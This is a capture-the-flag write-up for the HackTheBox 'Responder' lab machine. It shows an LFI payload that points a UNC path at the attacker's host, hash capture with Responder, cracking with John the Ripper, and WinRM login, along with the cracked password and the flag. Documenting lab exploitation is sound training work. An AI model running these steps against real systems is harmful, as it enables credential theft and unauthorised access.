# Responder - HackTheBox Writeup

**Date:** 2026-03-29
**OS:** Windows
**IP Address:** 10.129.15.55
**Difficulty:** Very Easy
**Points:** 10

---

# 1. Executive Summary

This writeup documents the exploitation process for the HackTheBox machine **Responder**. 

*   **Initial Access:** Gained by exploiting a Local File Inclusion (LFI) vulnerability to trigger an SMB connection and capture an NTLMv2 hash, which was then cracked to provide WinRM credentials.
*   **Privilege Escalation:** Not required for this "Starting Point" machine as the initial access provided the flag directly for a user in the Administrator group.
*   **Key Learning Points:** 
    * Understanding and exploiting LFI in web applications.
    * Capturing and cracking NTLMv2 hashes using Responder and John the Ripper.
    * Remote administration via WinRM.

---

# 2. Reconnaissance & Enumeration

## 2.1. Nmap Scan

| Port | Service | Version | Notes |
| :--- | :--- | :--- | :--- |
| 80/tcp | HTTP | Apache httpd 2.4.52 | PHP 8.1.1 on Win64 |
| 5985/tcp | WinRM | Microsoft HTTPAPI 2.0 | Windows Remote Management |

**Nmap Command:**
```bash
nmap -sC -sV -oN nmap/Responder -p 80,5985 10.129.15.55
```

## 2.2. Web Enumeration
**Strategy:** Inspecting the website and identifying parameters that might be vulnerable to LFI.

No additional subdomains were required once the `page` parameter was identified on the main site.

---

# 3. Initial Access (User Flag)

## 3.1. Vulnerability Analysis
*   **Vulnerability:** Local File Inclusion (LFI)
*   **Vector:** `page` parameter in the URL.

## 3.2. Exploitation Path
The `page` parameter was found to follow the redirection and include remote paths via SMB. By using a UNC path pointing to the attacker's machine, it was possible to capture the NTLMv2 hash of the `Administrator` user.

**Payload/Tool:**
1. Start Responder: `sudo responder -I tun0`.
2. Trigger LFI: `http://responder.htb/index.php?page=//10.10.14.240/somefile`.

The hash was captured and then cracked using John the Ripper.

**Cracking with John:**
```bash
john -w=/usr/share/wordlists/rockyou.txt hash.txt
# Results: Administrator:badminton
```

**WinRM Access:**
```bash
evil-winrm -u Administrator -p badminton -i 10.129.15.55
```

**User Flag:**
```text
ea81b7afddd03efaa0945333ed147fac
```
*Note: Located in C:\Users\mike\Desktop\flag.txt*

---

# 4. Privilege Escalation (Root Flag)

This machine is a single-level challenge; the Administrator access provided full control.

---

# 5. Credentials & Loot

| Username | Password / Hash | Source |
| :--- | :--- | :--- |
| Administrator | badminton | NTLMv2 Captured & Cracked |

---

# 6. Recommendations & Mitigation
1. **Sanitize Input:** Implement strict input validation for all parameters, especially those involving file inclusion or redirection.
2. **Disable Unnecessary SMB:** If possible, restrict outbound SMB traffic from the server to prevent hash capture.
3. **Strong Passwords:** Enforce complex and unique passwords for all administrative accounts.
